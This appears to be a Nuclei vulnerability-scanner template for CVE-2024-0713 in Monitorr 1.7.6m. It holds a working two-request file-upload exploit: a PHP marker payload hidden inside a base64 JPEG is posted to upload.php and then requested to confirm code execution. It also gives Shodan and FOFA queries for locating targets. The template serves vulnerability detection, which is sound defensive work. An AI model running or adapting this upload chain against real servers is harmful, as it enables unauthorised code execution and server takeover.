flow: http(1) && http(2)
http:
- matchers:
  - internal: true
    part: body
    type: word
    words:
    - 'has been uploaded to:'
  raw:
  - 'POST /assets/php/upload.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryaquxwjsn


    ------WebKitFormBoundaryaquxwjsn

    Content-Disposition: form-data; name="fileToUpload"; filename="{{file}}.php"

    Content-Type: image/jpeg


    {{base64_decode(''/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRofHh0aHBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/2wBDAQkJCQwLDBgNDRgyIRwhMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjL/wAARCAABAAEDASIAAhEBAxEB/8QAHwAAAQUBAQEBAQEAAAAAAAAAAAECAwQFBgcICQoL/8QAtRAAAgEDAwIEAwUFBAQAAAF9AQIDAAQRBRIhMUEGE1FhByJxFDKBkaEII0KxwRVS0fAkM2JyggkKFhcYGRolJicoKSo0NTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uHi4+Tl5ufo6erx8vP09fb3+Pn6/8QAHwEAAwEBAQEBAQEBAQAAAAAAAAECAwQFBgcICQoL/8QAtREAAgECBAQDBAcFBAQAAQJ3AAECAxEEBSExBhJBUQdhcRMiMoEIFEKRobHBCSMzUvAVYnLRChYkNOEl8RcYGRomJygpKjU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6goOEhYaHiImKkpOUlZaXmJmaoqOkpaanqKmqsrO0tba3uLm6wsPExcbHyMnK0tPU1dbX2Nna4uPk5ebn6Onq8vP09fb3+Pn6/9oADAMBAAIRAxEAPwD5/ooooA//2Tw/cGhwIGVjaG8gJ3h4eHh4eGF0ZmVyc290Zyc7Pz4='')}}

    ------WebKitFormBoundaryaquxwjsn--

    '
- matchers:
  - part: body
    type: word
    words:
    - atfersotg
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'GET /assets/data/usrimg/{{file}}.php HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2024-0713
info:
  author: DhiyaneshDK
  classification:
    cpe: cpe:2.3:a:monitorr:monitorr:1.7.6m:*:*:*:*:*:*:*
    cve-id: CVE-2024-0713
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.8
    cwe-id: CWE-434
    epss-percentile: 0.2356
    epss-score: 0.00061
  description: 'A vulnerability was found in Monitorr 1.7.6m. It has been declared
    as critical. Affected by this vulnerability is an unknown functionality of the
    file /assets/php/upload.php of the component Services Configuration. The manipulation
    of the argument fileToUpload leads to unrestricted upload. The attack can be launched
    remotely. The exploit has been disclosed to the public and may be used. The associated
    identifier of this vulnerability is VDB-251539. NOTE: The vendor was contacted
    early about this disclosure but did not respond in any way.

    '
  impact: 'Authenticated attackers can upload malicious files to achieve remote code
    execution, potentially compromising the entire Monitorr server and gaining access
    to monitored services.

    '
  metadata:
    fofa-query: icon_hash="-211006074"
    max-request: 2
    product: monitorr
    shodan-query: http.favicon.hash:"-211006074"
    vendor: monitorr
    verified: true
  name: Monitorr Services Configuration - Arbitrary File Upload
  reference:
  - https://github.com/Tropinene/Yscanner
  - https://github.com/fkie-cad/nvd-json-data-feeds
  - https://nvd.nist.gov/vuln/detail/CVE-2024-0713
  remediation: 'Upgrade to the latest patched version of Monitorr or apply vendor-provided
    security updates.

    '
  severity: high
  tags: cve,cve2024,file-upload,intrusive,monitorr,vuln
variables:
  file: '{{to_lower(rand_text_alpha(5))}}'
